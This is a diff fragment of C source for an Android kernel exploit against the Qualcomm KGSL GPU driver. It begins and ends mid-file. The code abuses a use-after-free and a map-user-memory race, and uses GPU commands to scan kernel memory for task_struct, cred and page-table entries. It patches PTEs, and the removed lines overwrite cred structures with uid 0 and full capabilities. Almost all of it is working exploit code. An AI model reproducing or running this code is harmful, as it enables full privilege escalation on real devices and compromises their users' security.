+    fprintf(stderr, "        Pages scanned: %d\n",   pages_scanned);
+    fprintf(stderr, "        Pages : %d\n",
+            non_zero_pages);
+    fflush(stderr);
+
+    if (only_once != 1) {
+        fprintf(stderr,
+                "    [!] only_once != 1 (task_struct not confirmed). Treating as failure.\n");
+        fflush(stderr);
+    }
+
+    *num_found = non_zero_pages;
+    found      = (only_once == 1);
+
+cleanup:
+    if (dst_vma && dst_vma != MAP_FAILED) munmap(dst_vma, dst_alloc.mmapsize);
+    if (ib_vma  && ib_vma  != MAP_FAILED) munmap(ib_vma,  ib_alloc.mmapsize);
+
+    if (dst_id) { struct kgsl_gpuobj_free fr = {0}; fr.id = dst_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
+    if (ib_id)  { struct kgsl_gpuobj_free fr = {0}; fr.id = ib_id;  ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
+
+
+    return found;
+}
+
+
+/* Analyze found pages  */
+static void analyze_found_pages(struct nonzero_page *pages, int num_pages)
+{
+    fprintf(stderr, "\n[+] Analyzing %d pages for patterns\n", num_pages);
+    fprintf(stderr, "========================================\n");
+    fflush(stderr);
+
+    uint64_t kernel_ds = (uint64_t)KERNEL_DS;      
+    uint64_t user_ds   = (uint64_t)USER_DS;        
+
+    uint32_t kds_lo = (uint32_t)(kernel_ds & 0xffffffffu);
+    uint32_t kds_hi = (uint32_t)(kernel_ds >> 32);
+
+    uint32_t uds_lo = (uint32_t)(user_ds & 0xffffffffu);
+    uint32_t uds_hi = (uint32_t)(user_ds >> 32);
+
+    for (int p = 0; p < num_pages; p++) {
+        fprintf(stderr, "\n[Page %d] VA 0x%llx, non-zero: %d/1024\n",
+                p + 1,
+                (unsigned long long)pages[p].va,
+                pages[p].non_zero_count);
+
+        uint32_t *data  = pages[p].data;
+        uint8_t  *bytes = (uint8_t *)data;
+
+        int comm_found  = 0;
+        int comm_offset = -1;
+        for (int offset = 0; offset < 4096 - 16; offset++) {
+            if (memcmp(bytes + offset, "KETO0422", 8) == 0) {
+                fprintf(stderr, "  [+] Found KETO0422 at offset 0x%03x\n", offset);
+                fprintf(stderr, "      Comm: %.16s\n", bytes + offset);
+                comm_found  = 1;
+                comm_offset = offset;
+
+                int cred_off = offset - 0x9C;
+                if (cred_off >= 0 && cred_off < 4000) {
+                    uint64_t cred = *(uint64_t *)(bytes + cred_off);
+                    if ((cred & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                        fprintf(stderr,
+                                "      Cred at 0x%03x: 0x%016llx\n",
+                                cred_off, (unsigned long long)cred);
+                        fprintf(stderr, "  [+++] CONFIRMED task_struct!\n");
+                    }
+                }
+                break;
+            }
+        }
+
+        fprintf(stderr, "\n  [*] Searching for FFFFFFC0 patterns:\n");
+        int ffffffc0_count = 0;
+
+        for (int i = 0; i < 1024; i++) {
+            if ((data[i] & 0xFFFFFFF0) == 0xFFFFFFC0) {
+                if (ffffffc0_count == 0) {
+                    fprintf(stderr, "      Found FFFFFFC0 patterns at:\n");
+                }
+
+                if (ffffffc0_count < 10) {
+                    fprintf(stderr, "        [0x%03x] %08X", i * 4, data[i]);
+
+                    if (i > 0) {
+                        uint64_t ptr = ((uint64_t)data[i] << 32) | data[i - 1];
+                        fprintf(stderr, " (64-bit: 0x%016llx)",
+                                (unsigned long long)ptr);
+                    }
+                    fprintf(stderr, "\n");
+                }
+
+                ffffffc0_count++;
+            }
+        }
+
+        if (ffffffc0_count > 0) {
+            fprintf(stderr, "      Total: %d FFFFFFC0 patterns\n", ffffffc0_count);
+        } else {
+            fprintf(stderr, "      No FFFFFFC0 patterns found\n");
+        }
+
+        fprintf(stderr,
+                "\n  [*] Searching for USER_DS (0x%08X%08X):\n",
+                uds_hi, uds_lo);
+        int user_ds_found = 0;
+
+        for (int i = 0; i < 1023; i++) {
+            if (data[i] == uds_lo && data[i + 1] == uds_hi) {
+                uint64_t val = ((uint64_t)uds_hi << 32) | uds_lo;
+                fprintf(stderr,
+                        "      [+] Found USER_DS at offset 0x%03x\n", i * 4);
+                fprintf(stderr,
+                        "          [0x%03x] %08X %08X\n",
+                        i * 4, data[i], data[i + 1]);
+                fprintf(stderr,
+                        "          Value: 0x%016llx\n",
+                        (unsigned long long)val);
+                user_ds_found = 1;
+            }
+        }
+
+        if (!user_ds_found) {
+            fprintf(stderr, "      No USER_DS pattern found\n");
+        }
+
+        if (comm_found) {
+            fprintf(stderr,
+                    "\n  [*] Checking thread_struct area (0xf00-0xf80) for addr_limit:\n");
+            int kds_pairs = 0;
+
+            for (int off = 0xf00; off < 0xf80; off += 8) {
+                int idx = off / 4;
+                if (idx + 1 < 1024) {
+                    if (data[idx] == kds_lo && data[idx + 1] == kds_hi) {
+                        fprintf(stderr,
+                                "      [0x%03x] %08X %08X (KERNEL_DS)\n",
+                                off, data[idx], data[idx + 1]);
+                        kds_pairs++;
+                    }
                 }
             }
-            close(notify_pipe[1]);
-            _exit(0);
+
+            fprintf(stderr,
+                    "      Found %d KERNEL_DS pairs in thread area\n",
+                    kds_pairs);
         }
-        if (p > 0) spray_pids[n_spray++] = p;
-        else break;
-    }
-    close(notify_pipe[1]);
-    printf("  Spawned %d children\n", n_spray);
 
-    // ===== Phase 7: GPU scan for task_struct =====
-    printf("[*] Phase 7: GPU scan for task_structs\n");
-
-    unsigned int ctx_id = create_context(kgsl_fd);
-    printf("  context=%u\n", ctx_id);
-
-    int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, alloc_flags);
-    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
-    uint64_t ib_ga = 0, ib_flags = 0;
-    gpuobj_info(kgsl_fd, ib_id, &ib_ga, &ib_flags);
-    printf("  IB id=%d gpuaddr=0x%lx flags=0x%lx (cache=%lu)\n", ib_id,
-        (unsigned long)ib_ga, (unsigned long)ib_flags,
-        (unsigned long)(ib_flags & KGSL_CACHEMODE_MASK));
-
-    int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, alloc_flags);
-    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
-    uint64_t dst_ga = 0, dst_flags = 0;
-    gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);
-    printf("  DST id=%d gpuaddr=0x%lx flags=0x%lx (cache=%lu)\n", dst_id,
-        (unsigned long)dst_ga, (unsigned long)dst_flags,
-        (unsigned long)(dst_flags & KGSL_CACHEMODE_MASK));
-
-    printf("  Scanning [0x%lx - 0x%lx]...\n",
-        (unsigned long)(UAF_ADDR + 0x1000),
-        (unsigned long)(UAF_ADDR + UAF_SIZE));
-
-    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
-    uint64_t task_pages[16];
-    uint32_t task_comm_offs[16];
-    int n_task = 0;
-    uint32_t task_page_data[SCAN_DWORDS];
-    uint64_t cred_pages[32];
-    int cred_offs[32];
-    int n_cred = 0;
-
-    uint64_t scan_start = UAF_ADDR + 0x300000;
-    if (scan_start < UAF_ADDR + 0x2000) scan_start = UAF_ADDR + 0x2000;
-
-    for (uint64_t va = scan_start; va < end_va && (n_task < 1 || n_cred < 1); va += 0x1000) {
-        if (((va - scan_start) & 0xFFFFF) == 0) { printf("."); fflush(stdout); }
-        uint32_t *cmd = (uint32_t *)ib_m;
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x1000);
-        int dw = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int i = 0; i < SCAN_DWORDS; i++) {
-            uint32_t dl, dh, sl, sh;
-            split64(dst_ga + i * 4, &dl, &dh);
-            split64(va + i * 4, &sl, &sh);
-            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0;
-            cmd[dw++] = dl; cmd[dw++] = dh;
-            cmd[dw++] = sl; cmd[dw++] = sh;
-        }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
-        if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
-        __sync_synchronize();
-
-        uint32_t *data = (uint32_t *)dst_m;
-        int nz = 0, n_comm = 0, comm_off = -1;
-        for (int i = 0; i < SCAN_DWORDS - 1; i++) {
-            if (data[i] != 0) nz++;
-            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
-                if (comm_off < 0) comm_off = i * 4;
-                n_comm++;
-            }
-        }
-        int cred_off_found = -1;
-        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
-            int cnt = 0;
-            for (int j = 0; j < 8; j++)
-                if (data[i + j] == 0x000007D0) cnt++;
-            if (cnt >= 4) { cred_off_found = i * 4; break; }
-        }
-        if (n_comm > 0) {
-            printf("  [TASK_COMM] va=0x%lx nz=%d comm_off=0x%x\n",
-                (unsigned long)va, nz, comm_off);
-            task_comm_offs[n_task] = comm_off;
-            task_pages[n_task++] = va;
-            if (n_task == 1) memcpy(task_page_data, data, SCAN_DWORDS * 4);
-        }
-        if (cred_off_found >= 0 && n_cred < 32) {
-            printf("  [CRED] va=0x%lx nz=%d off=0x%x\n",
-                (unsigned long)va, nz, cred_off_found);
-            cred_pages[n_cred] = va;
-            cred_offs[n_cred] = cred_off_found;
-            n_cred++;
-        }
-        // 扫描 task_security_struct 特征（6个相同dword）
-        int sec_hits[64]; int n_sec = 0;
-        for (int i = 0; i < SCAN_DWORDS - 6 && n_sec < 64; i++) {
-            if (data[i] == data[i+1] && data[i] == data[i+2] &&
-                data[i] == data[i+3] && data[i] == data[i+4] &&
-                data[i] == data[i+5] && data[i] != 0) {
-                int dup = 0;
-                for (int s = 0; s < n_sec; s++)
-                    if (sec_hits[s] == (int)data[i]) { dup = 1; break; }
-                if (!dup) {
-                    sec_hits[n_sec++] = data[i];
-                    if (data[i] < 10000)
-                        printf("  [SEC_CRED] va=0x%lx sid=%u off=0x%x\n",
-                            (unsigned long)va, data[i], i*4);
+        /* 5. Dump thread_struct area (0xf00-0xf80) if comm found */
+        if (comm_found) {
+            fprintf(stderr, "\n  [*] Thread_struct area dump (0xf00-0xf80):\n");
+            for (int off = 0xf00; off < 0xf80; off += 0x20) {
+                int idx = off / 4;
+                fprintf(stderr, "      [0x%03x]", off);
+                for (int j = 0; j < 8 && (idx + j) < 1024; j++) {
+                    fprintf(stderr, " %08X", data[idx + j]);
                 }
-                i += 6;
+                fprintf(stderr, "\n");
             }
         }
-    }
-    printf("[*] Scan complete: found %d task_struct pages, %d cred pages\n", n_task, n_cred);
 
-    // 保存 cred 部分字段（用于修复）
-    uint32_t saved_user_lo = 0, saved_user_hi = 0;
-    uint32_t saved_user_ns_lo = 0, saved_user_ns_hi = 0;
-    uint32_t saved_grp_lo = 0, saved_grp_hi = 0;
-
-    // Dump 第一个 cred 页布局
-    if (n_cred > 0) {
-        printf("[*] Phase 7c: Dumping first cred page for layout verification\n");
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x1000);
-        uint32_t *ccmd = (uint32_t *)ib_m;
-        int cdw = 0;
-        ccmd[cdw++] = cp_type7(CP_NOP, 0);
-        for (int ci = 0; ci < 48; ci++) {
-            uint32_t cdl, cdh, csl, csh;
-            split64(dst_ga + ci * 4, &cdl, &cdh);
-            split64(cred_pages[0] + cred_offs[0] + ci * 4, &csl, &csh);
-            ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            ccmd[cdw++] = 0; ccmd[cdw++] = cdl; ccmd[cdw++] = cdh;
-            ccmd[cdw++] = csl; ccmd[cdw++] = csh;
-        }
-        ccmd[cdw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int cts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
-            wait_timestamp(kgsl_fd, ctx_id, cts);
-            __sync_synchronize();
-            uint32_t *cd = (uint32_t *)dst_m;
-            printf("  cred+0x00:");
-            for (int ci = 0; ci < 48; ci++) {
-                if (ci > 0 && (ci % 8) == 0) printf("\n  cred+0x%02X:", ci*4);
-                printf(" %08X", cd[ci]);
-            }
-            printf("\n");
-            saved_user_lo = cd[32]; saved_user_hi = cd[33];
-            saved_user_ns_lo = cd[34]; saved_user_ns_hi = cd[35];
-            saved_grp_lo = cd[36]; saved_grp_hi = cd[37];
-        }
+        fprintf(stderr, "\n");
+        fflush(stderr);
     }
 
-    // ===== Phase 7e: Test GPU read from kernel VA (init_cred) =====
-    uint64_t inc_sec = 0;
-    {
-        printf("[*] Phase 7e: Testing GPU read from kernel VA (init_cred)\n");
-        memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
-        uint64_t test_vas[] = {
-            init_cred_addr,            // init_cred
-            init_cred_addr + 0x78,     // init_cred->security
-            0xFFFFFFC000000000ULL,     // PAGE_OFFSET
-            0xFFFFFF8000000000ULL,     // vmalloc base
-        };
-        uint32_t *tcmd = (uint32_t *)ib_m; int tdw = 0;
-        tcmd[tdw++] = cp_type7(CP_NOP, 0);
-        for (int i = 0; i < 4; i++) {
-            uint32_t dl, dh, sl, sh;
-            split64(dst_ga + i * 8, &dl, &dh);
-            split64(test_vas[i], &sl, &sh);
-            tcmd[tdw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            tcmd[tdw++] = 0; tcmd[tdw++] = dl; tcmd[tdw++] = dh;
-            tcmd[tdw++] = sl; tcmd[tdw++] = sh;
-        }
-        tcmd[tdw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int tts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, tdw*4, ib_id, &tts) == 0) {
-            wait_timestamp(kgsl_fd, ctx_id, tts);
-            __sync_synchronize();
-            uint32_t *td = (uint32_t *)dst_m;
-            for (int i = 0; i < 4; i++) {
-                uint64_t val = (uint64_t)td[i*2] | ((uint64_t)td[i*2+1] << 32);
-                printf("  KVA[%d]=0x%lX => 0x%016lX\n",
-                    i, (unsigned long)test_vas[i], (unsigned long)val);
-                if (i == 1) inc_sec = val;
+    fprintf(stderr, "========================================\n");
+    fflush(stderr);
+}
+
+
+static int scan_uaf_and_collect(int fd,
+				struct nonzero_page *pages,
+				int *num_pages)
+{
+	unsigned ctx_id = 0, ib_id = 0, dst_id = 0;
+	uint64_t ib_gpu = 0, dst_gpu = 0;
+	void *ib_vma = NULL, *dst_vma = NULL;
+	int found = 0;
+
+	*num_pages = 0;
+
+	fprintf(stderr, "\n[+] Scanning UAF region for non-zero pages\n");
+	fprintf(stderr, "    Region: 0x%llx ~ 0x%llx\n",
+		(unsigned long long)UAF_START,
+		(unsigned long long)(UAF_START + UAF_SIZE));
+
+	struct kgsl_drawctxt_create ctx = {
+		.flags = 0x00000010 | 0x00000002 /* PREAMBLE | NO_GMEM_ALLOC */
+	};
+	if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
+		fprintf(stderr, "    [!] Failed to create GPU context\n");
+		return 0;
+	}
+	ctx_id = ctx.drawctxt_id;
+
+	struct kgsl_gpuobj_alloc ib_alloc = {
+		.size  = PAGE_SIZE * 8,
+		.flags = KGSL_MEMFLAGS_USE_CPU_MAP
+	};
+	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
+		exit(1);
+
+	ib_id = ib_alloc.id;
+	ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
+		      MAP_SHARED, fd, ((off_t)ib_id) << 12);
+	if (ib_vma == MAP_FAILED)
+		exit(1);
+
+	struct kgsl_gpuobj_info info = { .id = ib_id };
+	ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
+	ib_gpu = info.gpuaddr;
+
+	struct kgsl_gpuobj_alloc dst_alloc = {
+		.size  = PAGE_SIZE,
+		.flags = KGSL_MEMFLAGS_USE_CPU_MAP
+	};
+	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
+		exit(1);
+
+	dst_id = dst_alloc.id;
+	dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
+		       MAP_SHARED, fd, ((off_t)dst_id) << 12);
+	if (dst_vma == MAP_FAILED)
+		exit(1);
+
+	info.id = dst_id;
+	ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
+	dst_gpu = info.gpuaddr;
+
+	fprintf(stderr, "    [+] IB GPU=0x%llx, DST GPU=0x%llx\n",
+		(unsigned long long)ib_gpu, (unsigned long long)dst_gpu);
+	fprintf(stderr, "    [*] Scanning... (. = 100 pages)\n");
+
+	uint64_t start_va   = UAF_START ;
+	uint64_t end_va     = UAF_START + UAF_SIZE;
+	uint64_t current_va = start_va;
+	int pages_scanned   = 0;
+	uint32_t *rb_count  = (uint32_t *)(gbuf + 0xb00);
+
+	while (current_va < end_va && *rb_count < MAX_FOUND_PAGES) {
+		uint32_t *cmd = (uint32_t *)ib_vma;
+		memset(ib_vma, 0, ib_alloc.mmapsize);
+		memset(dst_vma, 0, dst_alloc.mmapsize);
+		int dw = 0;
+
+		cmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+		for (int i = 0; i < 1024; i++) {
+			uint32_t d_lo, d_hi, s_lo, s_hi;
+			split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
+			split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);
+
+			cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
+			cmd[dw++] = 0;
+			cmd[dw++] = d_lo;
+			cmd[dw++] = d_hi;
+			cmd[dw++] = s_lo;
+			cmd[dw++] = s_hi;
+		}
+
+		cmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+		size_t ib_bytes = (size_t)dw * 4;
+		msync(ib_vma, ib_bytes, MS_SYNC);
+
+		struct kgsl_command_object cmd_obj = {
+			.gpuaddr = ib_gpu,
+			.size    = ib_bytes,
+			.flags   = 0x1,
+			.id      = ib_id
+		};
+
+		struct kgsl_gpu_command gpu_cmd = {0};
+		gpu_cmd.cmdlist    = (uint64_t)(uintptr_t)&cmd_obj;
+		gpu_cmd.cmdsize    = sizeof(cmd_obj);
+		gpu_cmd.numcmds    = 1;
+		gpu_cmd.context_id = ctx_id;
+
+		if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0)
+			break;
+		if (wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) != 0)
+			break;
+
+		msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
+
+		uint32_t *data = (uint32_t *)dst_vma;
+		int non_zero = 0;
+		for (int i = 0; i < 1024; i++) {
+			if (data[i] != 0)
+				non_zero++;
+		}
+
+		pages_scanned++;
+		if (pages_scanned % 100 == 0) {
+			fprintf(stderr, ".");
+			fflush(stderr);
+		}   
+
+		if (non_zero == 10) {
+            fprintf(stderr,"non_zero == 10\n");
+			if (non_zero == 10 &&
+			    data[2] && data[3] && data[6] && data[7] && data[10] && data[11] && data[14] && data[15] && data[18] && data[19] ) {
+				const uint32_t f53_mask = 0xFFF;
+				const uint32_t f53_tag  = 0xF53;
+				if (((data[2] & f53_mask) == f53_tag) &&
+				    ((data[6] & f53_mask) == f53_tag)) {
+                    fprintf(stderr, "vic_pte %x %x",data[2],data[3]);
+					memset(ib_vma, 0, ib_alloc.mmapsize);
+					int wdw = 0;
+					uint32_t *wcmd = (uint32_t *)ib_vma;
+
+					for (int i = 0; i < 4; i++)
+						wcmd[wdw++] = cp_type7_packet(CP_NOP, 0);
+
+					uint32_t t_lo, t_hi;
+
+					split64(current_va+8, &t_lo, &t_hi);
+					wcmd[wdw++] = cp_type7_packet(CP_MEM_WRITE, 3);
+					wcmd[wdw++] = t_lo;
+					wcmd[wdw++] = t_hi;
+					wcmd[wdw++] = data[6];
+
+					split64(current_va + 12, &t_lo, &t_hi);
+					wcmd[wdw++] = cp_type7_packet(CP_MEM_WRITE, 3);
+					wcmd[wdw++] = t_lo;
+					wcmd[wdw++] = t_hi;
+					wcmd[wdw++] = data[7];
+
+					for (int i = 0; i < 4; i++)
+						wcmd[wdw++] = cp_type7_packet(CP_NOP, 0);
+
+					if (*rb_count < MAX_FOUND_PAGES) {
+						uint8_t *slot = (uint8_t *)(gbuf + 0xb08 + (*rb_count) * 24);
+						*(uint64_t *)slot = current_va;
+                        fprintf(stderr,
+                                "cur_VA : %llx\n",
+                                (unsigned long long)*(uint64_t *)slot);
+						uint32_t *slot_dw = (uint32_t *)(slot + 8); //b10
+						slot_dw[0] = data[2]; //b10
+						slot_dw[1] = data[3]; //b14
+						slot_dw[2] = data[6]; //b18
+						slot_dw[3] = data[7]; //b1c
+						uint64_t *save_pte0 = (uint64_t *)(gbuf + PTE_SAVE_BASE + (*rb_count) * 8);
+						*save_pte0 = ((uint64_t)data[3] << 32) | data[2];
+						(*rb_count)++;
+					}
+
+
+					size_t patch_ib_bytes = (size_t)wdw * 4;
+					msync(ib_vma, patch_ib_bytes, MS_SYNC);
+
+					struct kgsl_command_object patch_obj = {
+						.gpuaddr = ib_gpu,
+						.size    = patch_ib_bytes,
+						.flags   = KGSL_CMDLIST_IB,
+						.id      = ib_id
+					};
+
+					struct kgsl_gpu_command patch_cmd = {0};
+					patch_cmd.cmdlist    = (uint64_t)(uintptr_t)&patch_obj;
+					patch_cmd.cmdsize    = sizeof(patch_obj);
+					patch_cmd.numcmds    = 1;
+					patch_cmd.context_id = ctx_id;
+
+					if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &patch_cmd) == 0 &&
+					    wait_timestamp(fd, ctx_id, patch_cmd.timestamp) == 0) {
+						fprintf(stderr,
+							"      [*] CP_MEM_WRITE: mirrored PTE 0x8 -> 0x0 on VA 0x%llx (F53 suffix)\n",
+							(unsigned long long)current_va);
+					} else {
+						fprintf(stderr,
+							"      [!] CP_MEM_WRITE failed while mirroring PTE on VA 0x%llx\n",
+							(unsigned long long)current_va);
+					}
+				} else {
+					fprintf(stderr,
+						"      [!] Skipping CP_MEM_WRITE: PTE low dword does not end with 0xF53\n");
+				}
+			}
+
+			if (*num_pages < MAX_FOUND_PAGES) {
+				struct nonzero_page *p = &pages[*num_pages];
+				p->va = current_va;
+				p->non_zero_count = non_zero;
+				memcpy(p->data, data, sizeof(p->data));
+				(*num_pages)++;
+			}
+
+			fprintf(stderr,
+				"\n\n    [!] Found page with == 10 non-zero dwords @ VA 0x%llx (%d/1024)\n",
+				(unsigned long long)current_va, non_zero);
+		}
+
+		current_va += PAGE_SIZE;
+	}
+
+	fprintf(stderr, "\n\n    [*] Scan done: scanned %d pages, collected %d pages\n",
+		pages_scanned, *num_pages);
+	found = *num_pages > 0;
+
+cleanup:
+    usleep(1000000);
+	if (dst_id) {
+		struct kgsl_gpuobj_free fr = {0};
+		fr.id = dst_id;
+		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+	}
+	if (ib_id) {
+		struct kgsl_gpuobj_free fr = {0};
+		fr.id = ib_id;
+		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+	}
+	if (dst_vma && dst_vma != MAP_FAILED)
+		munmap(dst_vma, dst_alloc.mmapsize);
+
+	if (ib_vma && ib_vma != MAP_FAILED)
+		munmap(ib_vma, ib_alloc.mmapsize);
+
+	return found;
+}
+
+static void dump_nonzero_pages(struct nonzero_page *pages, int num_pages)
+{
+    fprintf(stderr, "\n[+] Dumping %d non-zero pages\n\n", num_pages);
+    fflush(stderr);
+    
+    for (int p = 0; p < num_pages; p++) {
+        fprintf(stderr, "========================================\n");
+        fprintf(stderr, "Page %d: VA 0x%llx (%d non-zero dwords)\n",
+                p + 1,
+                (unsigned long long)pages[p].va,
+                pages[p].non_zero_count);
+        fprintf(stderr, "========================================\n");
+        
+        for (int i = 0; i < 1024; i++) {
+            if (i % 8 == 0) {
+                fprintf(stderr, "[0x%03x] ", i * 4);
+            }
+            
+            fprintf(stderr, "%08X ", pages[p].data[i]);
+            
+            if (i % 8 == 7) {
+                fprintf(stderr, "\n");
             }
         }
+        
+        fprintf(stderr, "\n");
+        fflush(stderr);
     }
+    
+    analyze_found_pages(pages, num_pages);
+}
 
-    // ===== Phase 7b: GPU→CPU coherency verification =====
-    printf("[*] Phase 7b: GPU→CPU coherency via DST buffer\n");
-    {
-        uint32_t *cmd = (uint32_t*)ib_m;
-        uint32_t sl, sh;
-        int dw = 0;
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x1000);
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        split64(dst_ga, &sl, &sh);
-        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-        cmd[dw++] = sl; cmd[dw++] = sh;
-        cmd[dw++] = 0xDEADBEEF; cmd[dw++] = 0xCAFEBABE;
-        split64(dst_ga + 8, &sl, &sh);
-        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-        cmd[dw++] = sl; cmd[dw++] = sh;
-        cmd[dw++] = 0x12345678; cmd[dw++] = 0x9ABCDEF0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
-            wait_timestamp(kgsl_fd, ctx_id, ts);
-            __sync_synchronize();
-            uint64_t v0 = *(volatile uint64_t*)dst_m;
-            uint64_t v1 = *(volatile uint64_t*)(dst_m + 8);
-            printf("  DST[0]=0x%016llX DST[1]=0x%016llX coherency=%s\n",
-                (unsigned long long)v0, (unsigned long long)v1,
-                (v0 == 0xCAFEBABEDEADBEEFULL &&
-                 v1 == 0x9ABCDEF012345678ULL) ? "OK **UAF cred write should work**" : 
-                 (v0 == 0 ? "FAIL (DST not written)" : "FAIL (wrong value)"));
-        }
+
+
+
+
+
+
+
+
+
+
+
+
+static void *mmap_gpuobj_fixed(int fd, unsigned int id, uint64_t mmapsize, 
+                                void *fixed_addr)
+{
+    off_t offset = ((off_t)id) << 12;
+    size_t len = mmapsize;
+    void *p = mmap(fixed_addr, len, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd, offset);
+    return p;
+}
+
+static void *bogus_racer(void *arg)
+{
+    race_state_t *rs = (race_state_t *)arg;
+    
+    while (!rs->ready) {
+        __asm__ __volatile__("" ::: "memory");
     }
+    
+    rs->bogus_started = 1;
+    __sync_synchronize();
+    
+    struct kgsl_map_user_mem req = {0};
+    req.fd = -1;
+    req.gpuaddr = 0;
+    req.len = WRAP_SIZE;                      // Wraps around!
+    req.offset = 0;
+    req.hostptr = BOGUS_START;
+    req.memtype = KGSL_USER_MEM_TYPE_ADDR;   
+    req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
+    
+    int ret = ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
+    int err = errno;
+    
+    rs->result = ret;
+    rs->saved_errno = err;
+    __sync_synchronize();
+    
+    return NULL;
+}
 
-    // ===== Phase 8b: Direct cred overwrite =====
-    if (n_cred > 0) {
-        printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
-        int n_ok = 0;
-        for (int p = 0; p < n_cred && p < 32; p++) {
-            uint64_t cbase = cred_pages[p] + cred_offs[p];
-            uint32_t *cmd = (uint32_t *)ib_m;
-            uint32_t zl, zh, dl, dh, sl, sh;
-            int dw;
-
-            // 读 before
-            memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
-            dw = 0;
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            for (int ci = 0; ci < 48; ci++) {
-                split64(dst_ga + ci * 4, &dl, &dh);
-                split64(cbase + ci * 4, &sl, &sh);
-                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                cmd[dw++] = sl; cmd[dw++] = sh;
-            }
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            __sync_synchronize();
-            unsigned int ts;
-            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-                wait_timestamp(kgsl_fd, ctx_id, ts);
-            __sync_synchronize();
-            uint32_t *bd = (uint32_t *)dst_m;
-            printf("  cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
-                p, bd[31], bd[30], bd[1]);
-
-            n_ok++;
-
-            // 设置 security 指针（若可读）
-            if (inc_sec != 0) {
-                printf("  Using init_cred->security = 0x%lX for cred[%d]\n",
-                    (unsigned long)inc_sec, p);
-                split64(cbase + 0x78, &zl, &zh);
-                cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-                cmd[dw++] = zl; cmd[dw++] = zh;
-                split64(inc_sec, &zl, &zh);
-                cmd[dw++] = zl; cmd[dw++] = zh;
-            }
-
-            // 写 uid=0 + caps
-            memset(ib_m, 0, 0x10000);
-            dw = 0;
-            split64(cbase + 0x04, &zl, &zh);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 21);
-            cmd[dw++] = zl; cmd[dw++] = zh;
-            for (int i = 0; i < 8; i++) cmd[dw++] = 0;
-            cmd[dw++] = 0x00000004;
-            cmd[dw++] = 0; cmd[dw++] = 0;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-            cmd[dw++] = 0; cmd[dw++] = 0;
-            // 读回 uid
-            memset(dst_m, 0, 0x1000);
-            split64(dst_ga, &dl, &dh);
-            split64(cbase + 0x04, &sl, &sh);
